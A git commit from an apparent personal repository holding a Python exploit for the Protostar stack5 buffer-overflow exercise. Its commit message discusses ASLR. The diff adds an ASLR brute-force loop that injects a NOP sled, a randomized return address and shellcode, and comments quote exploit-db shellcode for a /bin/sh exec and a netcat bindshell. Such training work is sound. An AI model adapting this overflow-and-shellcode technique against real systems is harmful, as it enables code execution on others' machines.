8d9860f7c0fa42dcbb37de19bf1cf4c7a13763eb
hark130 <hark130@yahoo.com>
2018-08-04 23:24:25 -0500

    master: BIG update to the stack5 solution
    	- I cleaned up some stuff (modularized how payloads are built)
    	- Made a mess in other places (swaths of old algorithms)
    	- Included some more payload variations while trying to trouble-shoot non-functionality (until I realized the REAL culprit... see ASLR notes below)
    	- There's a lot of DEBUGGING statements that are commented out
    	- I suspect there's some old algorithms commented out
    	- The "grinder" appears to be functional.  I may just reboot, let it run tonight, and see what happens.
    
    Moral of the story:
    	All of the "follow along" examples for stack5 I've found so far are like "this is so easy".  How they hell are they getting around ASLR?!  I literally lol'd when I read the Google synopsis for ASLR...
    ***Address Space Layout Randomisation (ASLR) is a technology used to help prevent shellcode from being successful.***
    Yeah, no shit!  Every solution for stack5 I've seen so far blithely ignores ASLR in their documented solution.  Maybe it's because I'm not running these exercises inside the protostar-provided VM.  Maybe they have ASLR turned off.
    
    Future Work:
    	- I saw one idea to brute force ASLR memory space and that gave me some ideas.  I've already implemented Opcoad.py functionality to help me randomize the overflowed return value.  If I get real wicked crafty, I start dynamically calling gdb at run time to find out what the *actual* RVA was and adjust my randomization algorithm during runtime.  I feel like I've already accidentally gotten lucky a few times.  I was just so involved getting my byte-to-hex-to-string-to-hex-value-to-string-to-little-endian-and-back-again logging/automation functional that I missed it.
    	- Code up a C-style call to write and reverse the binary on this Fedora VM.  Something shady is going on here.  Am I too used to developing on my Ubuntu machine?
    	- Verify that shell code worlks like you think it works by getting some REAL cdecl shell code and manually making it sit up and beg in gdb.
    	- Research a way to disable(?) ASLR (or minimize the randomizations?)
    
    Lessons Learned(?):
    	- I was chasing my tail for a while while reworking the Opcoad.py helper functions.  ugh.  Uuhhh... better initial design?  Walk away when you're fatigued or frustrated?  This is a lesson it may take a while longer to learn.
    	- Pay attention to the calling conventions in IDA and gdb.  I was working on stack5 blithely assuming it used the SysV calling convention.  I didn't notice that parameters weren't going into registers in gdb.  I also missed it when IDA informed me that main was actually _cdecl main().  I lost at least an hour troubleshooting phantom gremlins until I realized I was using the wrong calling convention.  Never again(?)!
    
    Changes to be committed:
    	modified:   stack5-solution.py

--- protostar-bin/stack5-solution.py
+++ protostar-bin/stack5-solution.py
@@ -1,7 +1,10 @@
 #!/usr/bin/python
 
+from __future__ import print_function
 from Opcoad import convert_opcode
+from Opcoad import convert_str_to_hex_bytes
 from Opcoad import convert_opcode_bytes
+from Opcoad import generate_addrs
 from Opcoad import escape_hex
 from Opcoad import reverse_endianness
 from subprocess import Popen
@@ -14,8 +17,13 @@ BINARY_NAME = "stack5"
 
 def main():
     # LOCAL VARIABLES
+    upperLim = 1000  # Don't execute BINARY_NAME more than upperLim times
     currEnv = os.environ.copy()
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
+    buffOverflow = escape_hex("90" * 76)
+    newRet = escape_hex("41414141")  # 0xffe16330, 0xfff5cfe0, 0xffc53620, 0xff92ce90, 0xff8ab9f0
+    hexAddr = ""  # Convert addresses to hex strings here
+    nopSled = escape_hex("90" * 100)
     # Linux/x86 - stdin re-open and /bin/sh exec Shellcode (39 bytes) - https://www.exploit-db.com/exploits/13357/
     # shellCode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
     # Linux/x86 - netcat bindshell port 8080 Shellcode (75 bytes) - https://www.exploit-db.com/exploits/14332/
@@ -29,7 +37,9 @@ def main():
     # Pink slip shell code compiled for cdecl calling convention (no newline) syscall number in rax
     # shellCode = "\xeb\x13\x48\x31\xc0\x5e\x6a\x28\x56\x6a\x01\xb8\x01\x00\x00\x00\x0f\x05\x83\xc4\x18\xe8\xe8\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x00"
     # Pink slip shell code updated based on RE'd syscall to write
-    shellCode = escape_hex("eb154831c0b801000000bf010000005e4831d2b2280f05e8e6ffffff5468617420776561766520676f74746120676f2e2050696e6b20736c69702e202d4361726469204200")
+    # shellCode = escape_hex("eb154831c0b801000000bf010000005e4831d2b2280f05e8e6ffffff5468617420776561766520676f74746120676f2e2050696e6b20736c69702e202d4361726469204200")
+    # Pink slip shell code with int 80h instead of int 0x80 (?)
+    shellCode = escape_hex("eb15bf010000005e4831d2b2284831c0b804000000cd80e8e6ffffff5468617420776561766520676f74746120676f2e2050696e6b20736c69702e202d4361726469204200")
     # print(shellCode)  # DEBUGGING
 
     # payload = shellCode + ("\xCC" * (76 - shellCode.__len__())) + pack("I", 0xffffd290)
@@ -56,28 +66,64 @@ def main():
     # print(shellCode.__len__())  # DEBUGGING
     # print(76 - shellCode.__len__())  # DEBUGGING
     # print("\x90" * (76 - shellCode.__len__()))  # DEBUGGING
-    payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\x90\xd2\xff\xff"
+    # payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\x90\xd2\xff\xff"
+    # payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\x41\x41\x41\x41"
     # print(payload.__len__())  # DEBUGGING
     # print(payload)  # DEBUGGING
+    payload = ""
     commandList = []
 
     # VERIFY FILE    
     if not os.path.isfile(absBinFilename):
         raise IOError("{} not found".format(absBinFilename))
 
-    # CONVERT PAYLOAD
-    # payload = convert_opcode(payload, "90")  # Don't use convert_opcode() here.  We already have the hex.
-    # print(type(payload))  # DEBUGGING
-    # payload = convert_opcode_bytes(payload, "90")
-    with open("stack5-Opcoad-solution.txt", "w") as outFile:
-        outFile.write(payload)
+    # OUTPUT PAYLOAD
+    # NOTE: Commented out because I'm setting up for an automated anti-ASLR brute-force run
+    # with open("stack5-Opcoad-solution.txt", "w") as outFile:
+        # outFile.write(payload)
+
+    
 
     # RUN IT
-    with open(BINARY_NAME + "_output.txt", "w") as output:
+    with open(BINARY_NAME + "-ASLR_brute_force.txt", "w") as output:
         commandList.append(absBinFilename)
-        binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = output, stderr = output)
-        if binary is not None:
-            binary.communicate(payload)
+        print("Attempting to brute force {}\n[".format(BINARY_NAME), end="")
+        for ignoreThis in range(0, upperLim):
+            binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE, stderr = PIPE)
+            if binary is not None:
+                # CONSTRUCT PAYLOAD
+                try:
+                    newRet = generate_addrs(None, None, [0x8a, 0xf5], "ff")
+                    # newRet = generate_addrs([20, 21], [144, 145], [250, 251], "ff")  # DEBUGGING
+                    # newRet = generate_addrs([20, 21], [144, 145], [250, 251], [255, 255])  # DEBUGGING
+                except Exception as err:
+                    print(repr(err))
+                    print(newRet)
+                    raise err
+                # else:
+                #     for char in newRet:
+                #         print(ord(char))
+                # print(newRet)  # DEBUGGING
+                # print(escape_hex(newRet))  # DEBUGGING
+                # print(type(newRet))  # DEBUGGING
+                # print(newRet.__len__())  # DEBUGGING
+                hexAddr = reverse_endianness(newRet)
+                payload = buffOverflow + escape_hex(newRet) + nopSled + shellCode
+                # print(hexAddr)  # DEBUGGING
+                output.write("Trying address:\t{}\n".format("0x" + hexAddr))
+                tmpRet = binary.communicate(payload)
+                if tmpRet[0] or tmpRet[1]:
+                    # print(tmpRet)  # DEBUGGING
+                    print("!", end="")
+                    output.write(tmpRet)
+                else:
+                    print(".", end="")
+                binary.wait()  # Block                
+    print("]")
+
+    # OUTPUT PAYLOAD
+    with open("stack5-Opcoad-solution.txt", "w") as outFile:
+        outFile.write(payload)
 
     # DONE
     return
